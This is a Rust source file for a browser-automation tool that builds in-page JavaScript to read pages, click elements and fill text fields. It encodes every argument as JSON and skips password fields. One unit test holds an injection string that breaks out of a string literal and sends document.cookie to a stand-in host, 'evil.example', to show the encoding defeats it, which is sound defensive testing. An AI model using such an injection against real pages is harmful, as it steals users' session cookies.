//! Scripts that run inside a web page to read it, click something or fill a field. They are built as text with their
//! arguments encoded as JSON, never by joining the arguments into code, so a page-controlled string cannot become code.
use serde_json::{Value, json};

pub const READ_SCRIPT: &str = "(() => ({ text: document.body ? document.body.innerText : '', title: document.title, url: location.href }))()";

const CLICK: &str = r#"((wanted) => {
  const want = wanted.replace(/\s+/g, ' ').trim().toLowerCase();
  const selector = 'a[href],button,[role="button"],[role="link"],[role="menuitem"],[role="tab"],input[type="submit"],input[type="button"],summary';
  const visible = (el) => {
    const rect = el.getBoundingClientRect();
    const style = getComputedStyle(el);
    return rect.width > 0 && rect.height > 0 && style.visibility !== 'hidden' && style.display !== 'none';
  };
  const labelOf = (el) => {
    const aria = el.getAttribute('aria-label');
    const raw = aria || (el instanceof HTMLInputElement ? el.value : '') || el.textContent || el.getAttribute('title') || '';
    return raw.replace(/\s+/g, ' ').trim();
  };
  const all = [...document.querySelectorAll(selector)].filter(visible);
  const exact = all.filter((el) => labelOf(el).toLowerCase() === want);
  const found = exact.length > 0 ? exact : all.filter((el) => labelOf(el).toLowerCase().includes(want));
  if (found.length === 0) return { ok: false, what: `nothing on the page is called "${wanted}"` };
  if (found.length > 1) return { ok: false, what: `${found.length} things match "${wanted}": ${found.slice(0, 5).map((el) => `"${labelOf(el).slice(0, 40)}"`).join(', ')}. Use more of the text.` };
  const target = found[0];
  const kind = target.tagName === 'A' ? 'link' : target.tagName === 'BUTTON' || target.getAttribute('role') === 'button' ? 'button' : 'item';
  const name = labelOf(target).slice(0, 80);
  target.scrollIntoView({ block: 'center' });
  target.click();
  return { ok: true, what: `${kind} "${name}"` };
})"#;

const TYPE: &str = r#"((wanted, value, submit) => {
  const want = wanted.replace(/\s+/g, ' ').trim().toLowerCase();
  const visible = (el) => {
    const rect = el.getBoundingClientRect();
    return rect.width > 0 && rect.height > 0 && getComputedStyle(el).visibility !== 'hidden';
  };
  const skip = new Set(['hidden', 'checkbox', 'radio', 'file', 'submit', 'button', 'image', 'reset', 'range', 'color']);
  const fields = [...document.querySelectorAll('input,textarea')].filter((el) => visible(el) && !(el instanceof HTMLInputElement && skip.has(el.type)));
  const names = (el) => {
    const labels = [...(el.labels ?? [])].map((l) => l.textContent ?? '');
    return [...labels, el.getAttribute('aria-label') ?? '', el.placeholder, el.name, el.id].map((s) => s.replace(/\s+/g, ' ').trim().toLowerCase()).filter(Boolean);
  };
  const exact = fields.filter((el) => names(el).includes(want));
  const found = exact.length > 0 ? exact : fields.filter((el) => names(el).some((n) => n.includes(want)));
  if (found.length === 0) return { ok: false, what: `no text box on the page is called "${wanted}"` };
  if (found.length > 1) return { ok: false, what: `${found.length} text boxes match "${wanted}". Use more of the label.` };
  const field = found[0];
  if (field instanceof HTMLInputElement && field.type === 'password') return { ok: false, what: 'that is a password field. Mobius never types into those.' };
  if (field.readOnly || field.disabled) return { ok: false, what: 'that field cannot be edited' };
  field.scrollIntoView({ block: 'center' });
  field.focus();
  const proto = field instanceof HTMLInputElement ? HTMLInputElement.prototype : HTMLTextAreaElement.prototype;
  Object.getOwnPropertyDescriptor(proto, 'value')?.set?.call(field, value);
  field.dispatchEvent(new Event('input', { bubbles: true }));
  field.dispatchEvent(new Event('change', { bubbles: true }));
  if (submit) {
    const form = field.form;
    if (form) form.requestSubmit();
    else field.dispatchEvent(new KeyboardEvent('keydown', { key: 'Enter', code: 'Enter', bubbles: true }));
  }
  return { ok: true, what: `text box "${wanted}"` };
})"#;

pub fn click_script(text: &str) -> String {
    format!("({CLICK})({})", json!(text))
}

pub fn type_script(field: &str, text: &str, submit: bool) -> String {
    format!("({TYPE})({},{},{})", json!(field), json!(text), json!(submit))
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ActionResult {
    pub ok: bool,
    pub what: String,
}

/// Whatever the page script gave back, as a plain result the tools can trust the shape of.
pub fn as_action_result(raw: &Value) -> ActionResult {
    match (raw.get("ok").and_then(Value::as_bool), raw.get("what").and_then(Value::as_str)) {
        (Some(ok), Some(what)) => ActionResult { ok, what: what.chars().take(300).collect() },
        _ => ActionResult { ok: false, what: "the page did not respond".into() },
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn arguments_are_encoded_not_joined_so_a_page_string_cannot_become_code() {
        let evil = "\"); fetch('http://evil.example/' + document.cookie); (\"";
        let script = click_script(evil);
        assert!(script.ends_with(&format!("({})", json!(evil))), "{script}");
        assert_eq!(script.matches("fetch(").count(), 1, "only inside the encoded string");
        let typed = type_script("f\u{2028}ield", "line\nbreak \"quoted\" </script>", true);
        assert!(typed.contains("\\n") && typed.contains("\\\"quoted\\\""));
        assert!(typed.ends_with(",true)"));
        assert!(type_script("a", "b", false).ends_with(",false)"));
    }

    #[test]
    fn the_scripts_never_touch_password_fields_or_leave_the_page_world() {
        assert!(TYPE.contains("field.type === 'password'"));
        assert!(!CLICK.contains("fetch(") && !TYPE.contains("fetch(") && !CLICK.contains("XMLHttpRequest") && !TYPE.contains("XMLHttpRequest"));
    }

    #[test]
    fn whatever_the_page_answers_becomes_a_plain_result() {
        assert_eq!(as_action_result(&json!({ "ok": true, "what": "link \"More\"" })), ActionResult { ok: true, what: "link \"More\"".into() });
        assert_eq!(as_action_result(&json!({ "ok": false, "what": "x".repeat(500) })).what.len(), 300);
        for odd in [json!(null), json!("ok"), json!({ "ok": "yes", "what": "x" }), json!({ "ok": true }), json!({ "what": "x" }), json!([1]), json!(5)] {
            assert_eq!(as_action_result(&odd), ActionResult { ok: false, what: "the page did not respond".into() }, "{odd}");
        }
    }
}
